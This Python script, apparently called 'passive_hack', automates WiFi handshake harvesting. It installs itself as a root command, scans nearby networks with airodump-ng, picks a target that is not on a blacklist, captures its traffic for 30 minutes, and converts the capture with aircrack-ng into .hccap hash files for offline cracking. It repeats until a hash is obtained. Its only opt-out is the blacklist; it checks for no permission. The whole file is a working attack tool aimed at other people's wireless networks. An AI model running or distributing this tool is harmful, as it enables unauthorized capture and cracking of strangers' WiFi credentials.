#!/usr/bin/env python
import os
import subprocess
import time
import signal
import glob, os, os.path
import sys
import random
import shutil
import glob
import threading

interface = ""
scan_interval = 420 # 5 minutes

def firsttime():
	os.makedirs("/root/passive_hack/")
	os.makedirs("/root/passive_hack/.cache/")
	os.makedirs("/root/passive_hack/.cache/scans/")
	os.makedirs("/root/passive_hack/.cache/processes/")
	os.makedirs("/root/passive_hack/.cache/captures/")
	os.makedirs("/root/passive_hack/.cache/convert/")
	os.makedirs("/root/passive_hack/.cache/aircrack/")
	os.makedirs("/root/passive_hack/captures/")
	f = open("/root/passive_hack/blacklist.txt","a")
	f.write(
		"## BLACKLIST LIST\n"+
		"##   The script will blacklist WIFI networks if a captured hash is found\n"+
		"##   You might also want to add your own\n"+
		"##   Add either BSSID example: \"D4:41:FC:64:66:CE\" or ESSID example: \"YourWifiName\" (without quotes)\n"
		)
	f.close()
	open("/root/passive_hack/blacklist.txt", 'a').close()
	shutil.copy(__file__, '/root/passive_hack/passive_hack.py')
	shutil.copy(__file__, '/usr/bin/passive')
	print ("successfully installed")
	print ("run with this command:")
	print ("  passive wlan0mon")
	exit()

if os.path.isdir("/root/passive_hack/") == False:
	firsttime()

def bashcommand(cmd):
	os.popen(cmd)

def file_get_contents(filename):
	with open(filename) as f:
		return f.read()

def scan(interface, scan_interval):
	for file in glob.glob("/root/passive_hack/.cache/scans/scan-"+interface+"*.csv"):
		if file != "":
			os.remove(file)
	process = subprocess.Popen(
		"airodump-ng "+interface+" -w /root/passive_hack/.cache/scans/scan-"+interface+" -o csv & sleep "+str(scan_interval)+" ; kill $!",
		shell=True
		#stdout=subprocess.PIPE,
		#stderr=subprocess.PIPE
	)
	out, err = process.communicate()

def findnexttarget(interface, blacklist):
	info = file_get_contents("/root/passive_hack/.cache/scans/scan-"+interface+"-01.csv")
	busy = []
	if os.path.isfile("/root/passive_hack/.cache/processes/"+interface) == True:
		os.remove("/root/passive_hack/.cache/processes/"+interface)
	for file in glob.glob("/root/passive_hack/.cache/processes/*"):
		if file != "":
			busy.append(file_get_contents(file))
	for line in info.split("\n"):
		if "," in line and line.count(",") > 13 and line.split(",")[0] != "BSSID" and line.split(",")[13].strip() != "":
			name = line.split(",")[13].strip()
			BSSID = line.split(",")[0].strip()
			CHANNEL = line.split(",")[3].strip()
			for line2 in blacklist + busy:
				if line2 != name and line2 != BSSID:
					f = open("/root/passive_hack/.cache/processes/"+interface,"a")
					f.write(BSSID)
					f.close()
					return BSSID, CHANNEL, name


def capture(interface, BSSID, CHANNEL, NAME):
	while True:
		for file in glob.glob("/root/passive_hack/.cache/captures/"+interface+"*"):
			if file != "":
				os.remove(file)
		
		timeout = 1800
		cmd = "airodump-ng -c "+str(CHANNEL)+" --bssid "+BSSID+" -w /root/passive_hack/.cache/captures/"+interface + " "+ interface+ " & sleep "+str(timeout)+" ; kill $!"
		processThread = threading.Thread(target=bashcommand, args=[cmd]).start()
		print ("capturing")
		time.sleep(timeout)

		print ("hey Hey")
		if os.path.isfile("/root/passive_hack/.cache/convert/"+interface+".cap") == True:
			os.remove("/root/passive_hack/.cache/convert/"+interface+".cap")
		shutil.copy("/root/passive_hack/.cache/captures/"+interface+"-01.cap", "/root/passive_hack/.cache/convert/"+interface+".cap")
		cmd = "aircrack-ng -J /root/passive_hack/captures/" + NAME + " /root/passive_hack/.cache/convert/"+interface+".cap"
		#processThread = threading.Thread(target=bashcommand, args=[cmd]).start().join()
		output = os.popen(cmd)
		time.sleep(2)
		if os.path.isfile("/root/passive_hack/captures/" + NAME + ".hccap") == True:
			break


if len(sys.argv) == 2:
	interface = sys.argv[1]
else:
	print ("No interface provided..")
	print ("Example: \"passive wlan0mon\"")
	exit()

if os.path.isfile("/root/passive_hack/.cache/processes/"+interface) == True:
	os.remove("/root/passive_hack/.cache/processes/"+interface)
scan(interface, scan_interval)
blacklist = []
for line in file_get_contents("/root/passive_hack/blacklist.txt").split("\n"):
	if line.strip()[0] != "#":
		blacklist.append(line.strip())

BSSID, CHANNEL, NAME = findnexttarget(interface, blacklist)
print ("BSSID: " + BSSID + "\nName: " + NAME+"\nChannel: "+CHANNEL)
time.sleep(2)
capture(interface, BSSID, CHANNEL, NAME)


#c=0
#for interface in interfaces:
#	process[c].terminate()
#	c+=1


#process = subprocess.Popen(cmd, shell=True)
#time.sleep(5)
#os.kill(process.pid, signal.SIGINT)